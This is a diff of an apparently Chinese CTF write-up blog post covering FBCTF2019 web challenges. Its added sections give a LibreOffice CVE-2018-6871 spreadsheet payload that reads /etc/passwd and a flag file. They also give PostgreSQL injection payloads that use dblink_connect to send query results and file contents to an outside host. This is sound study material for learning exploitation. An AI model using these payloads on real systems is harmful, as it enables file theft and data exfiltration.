@@ -1,19 +1,19 @@
-﻿---
-title: "FBCTF2019wp"
+---
+title: Facebook CTF2019wp
 date: 2026-05-11T20:48:23+08:00
 lastmod: 2026-05-11T20:48:23+08:00
-summary: " "
-url: "/posts/FBCTF2019wp/"
+summary: 远古老题
+url: /posts/FacebookCTF2019wp/
 categories:
-  - "赛题wp"
+  - 赛题wp
 tags:
-  - "FBCTF2019"
-draft: true
+  - FBCTF2019
+draft: false
 ---
 
-# [FBCTF2019] Products Manager
+# \[FBCTF2019\] Products Manager
 
-## #基于约束的SQL攻击
+## \#基于约束的SQL攻击
 
 打开环境有`/add.php`添加产品，`/view.php`查看产品
 
@@ -21,7 +21,7 @@ draft: true
 
 先看看源码，一共有六个文件
 
-![image-20260511205434547](image/image-20260511205434547.png)
+![](image/Pasted%20image%2020260512200445.png)
 
 footer.php是空的，header.php就是环境主页的代码
 
@@ -259,9 +259,9 @@ name=facebook                                                        a&secret=aA
 
 ![image-20260511212225294](image/image-20260511212225294.png)
 
-# [FBCTF2019] Event
+# \[FBCTF2019\] Event
 
-## #SSTI+session伪造
+## \#SSTI+session伪造
 
 注册登录后有一个添加事件的panel，管理员面板没法看，看看cookie
 
@@ -347,9 +347,9 @@ index()
 
 ![image-20260511220037110](image/image-20260511220037110.png)
 
-# [FBCTF2019]RCEService
+# \[FBCTF2019\]RCEService
 
-## #PCRE回溯绕过/换行绕过preg
+## \#PCRE回溯绕过/换行绕过preg
 
 是一个Web管理界面，可以传入json格式的命令
 
@@ -459,3 +459,243 @@ preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|co
 
 基于上面的解释，对于其他师傅的wp里的poc也就不难理解了
 
+# \[FBCTF2019\] pdfme
+
+## \#LibreOffice6.0 任意文件读取CVE-2018-6871
+
+题目描述
+
+```html
+我们设立这个 PDF 转换服务是为了方便公众使用，希望它是安全的。
+```
+
+这个在buu没环境，只能从GitHub拉项目下来本地部署了
+
+项目地址：[https://github.com/fbsamples/fbctf-2019-challenges]()
+
+在pdfme文件夹下执行命令
+
+```bash
+docker build --tag=pdf .
+docker run -p 80:80 pdf
+
+或者直接构建启动
+docker compose up --build
+```
+
+访问http://127.0.0.1:80/就出来了
+
+```html
+Choose a file to upload (.fods, max 64kb, lowercase name)
+```
+
+只能上传.fods后缀文件，并且上传后会转化成pdf
+
+**FODS文件** 是 **Flat OpenDocument Spreadsheet** 的缩写，是 LibreOffice/OpenOffice 使用的一种电子表格格式。
+
+先上传一个标准的fods文件上去看看
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document
+  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
+  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
+  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
+  office:mimetype="application/vnd.oasis.opendocument.spreadsheet"
+  office:version="1.3">
+  <office:body>
+    <office:spreadsheet>
+      <table:table table:name="Sheet1">
+        <table:table-row>
+          <table:table-cell office:value-type="string">
+            <text:p>A</text:p>
+          </table:table-cell>
+        </table:table-row>
+      </table:table>
+    </office:spreadsheet>
+  </office:body>
+</office:document>
+```
+
+意思很简单，就是一个包含一个单元格且内容为A的表格
+
+但是我传上去一直报500，后面发现是docker镜像缺少一个libxinerama1库，进去安装一下
+
+```bash
+apt-get update && apt-get install -y \ libcups2 \ libxinerama1 \ libglu1-mesa \ libx11-6 \ libxext6 \ libxrender1 \ libxtst6 \ libxi6 \ libfontconfig1
+```
+
+传上去之后pods文件会转化成pdf文件
+
+![](image/Pasted%20image%2020260512222344.png)
+
+将pdf下载下来，利用exiftool查看文件信息
+
+```bash
+C:\Users\23232\Desktop\附件\脚本>exiftool 1.pdf
+ExifTool Version Number         : 13.58
+File Name                       : 1.pdf
+Directory                       : .
+File Size                       : 7.8 kB
+File Modification Date/Time     : 2026:05:12 22:25:37+08:00
+File Access Date/Time           : 2026:05:12 22:25:41+08:00
+File Creation Date/Time         : 2026:05:12 22:25:41+08:00
+File Permissions                : -rw-rw-rw-
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Media Box                       : 0, 0, 595, 841
+Page Count                      : 1
+Creator                         : Calc
+Producer                        : LibreOffice 6.0
+Create Date                     : 2026:05:12 14:22:24Z
+```
+
+可以看到使用的是 **LibreOffice 6.0**，那么就存在一个CVE-2018-6871
+
+https://www.cvedetails.com/cve/CVE-2018-6871/
+
+`LibreOffice 5.4.5 之前的版本和 6.x 6.0.1 之前的版本允许远程攻击者通过文档中的 =WEBSERVICE 调用读取任意文件，这些调用使用了 COM.MICROSOFT.WEBSERVICE 函数。`
+
+那就改一下单元格内容
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document
+  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
+  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
+  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
+  office:mimetype="application/vnd.oasis.opendocument.spreadsheet"
+  office:version="1.3">
+  <office:body>
+    <office:spreadsheet>
+      <table:table table:name="Sheet1">
+        <table:table-row>
+          <table:table-cell table:formula="=COM.MICROSOFT.WEBSERVICE(&quot;file:///etc/passwd&quot;)">
+          </table:table-cell>
+        </table:table-row>
+      </table:table>
+    </office:spreadsheet>
+  </office:body>
+</office:document>
+```
+
+![](image/Pasted%20image%2020260512223714.png)
+
+回显出当前用户的主目录为/home/libreoffice_admin，估计flag在根目录下，尝试读取flag
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document
+  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
+  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
+  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
+  office:mimetype="application/vnd.oasis.opendocument.spreadsheet"
+  office:version="1.3">
+  <office:body>
+    <office:spreadsheet>
+      <table:table table:name="Sheet1">
+        <table:table-row>
+          <table:table-cell table:formula="=COM.MICROSOFT.WEBSERVICE(&quot;file:///home/libreoffice_admin/flag&quot;)">
+          </table:table-cell>
+        </table:table-row>
+      </table:table>
+    </office:spreadsheet>
+  </office:body>
+</office:document>
+```
+
+![](image/Pasted%20image%2020260512223911.png)
+
+成功拿到flag
+
+# \[FBCTF2019\] hr_admin_module
+
+## \#PostgreSQL注入
+
+这个也是需要自己搭建环境的，不过环境也比较老了需要让ai修一下
+
+```bash
+docker compose up -d --build
+```
+
+
+![](image/Pasted%20image%2020260513140340.png)
+
+![](image/Pasted%20image%2020260513140451.png)
+
+提示无法显示文件 /var/lib/postgresql/data/secret，当前用户权限不够
+
+但是从这个路径也可以看出后端数据库是postgresql
+
+测了一下查找员工的功能，但是没啥回显，看看另一个被禁用的查找用户的功能
+
+前端禁用其实就等于没禁用，改一下或者直接抓包改包就行了
+
+![](image/Pasted%20image%2020260513141729.png)
+
+传入单引号出现警告，加上注释警告就没了
+
+![](image/Pasted%20image%2020260513141813.png)
+
+那就是存在SQL注入的，是pgsql注入，测一下过滤
+
+mad我发现我本地启动的环境很不稳定，有些payload测了两次是不同的
+
+直接参考大佬的wp吧：
+
+https://xz.aliyun.com/news/5030#toc-1
+
+https://balsn.tw/ctf_writeup/20190603-facebookctf/#hr_admin_module
+
+其实做法就是先打OOB带外注入或者盲注
+
+## OOB带外注入
+
+OOB带外注入需要我们自己搭建一个pgsql的服务，然后调用dblink_connect函数去建立远程会话
+
+连接到我们搭建的pgsql服务，我们通过监听服务端口就可以查看请求包的信息
+
+例如我们尝试建立连接
+
+```sql
+a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=postgres password= dbname=postgres')) --
+```
+
+此时在请求包上就会携带连接信息
+
+爆数据库
+
+```sql
+a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
+```
+
+`||`在pgsql中是连接符的意思，这里其实就是将查询结果拼接到user里面，我们在请求包上就能看
+
+到结果
+
+## 时间盲注
+
+根据wp里面所说，这里其实是有过滤的，不过可以用repeat()去进行延时，比如
+
+```sql
+'and 1=2 union select NULL, (select case when 1=1 then (select repeat('a', 10000000)) else NULL end)--
+```
+
+不过flag是在文件中，需要调用lo_import()函数将文件
+
+加载到postgres 对象中
+
+```sql
+a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
+```
+
+此时会返回一个对象ID，最后读取整个对象ID就行了
+
+```sql
+a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=postgres dbname=postgres')) --
+```
+
+最后还有一个xss的比较难，暂时还看不懂
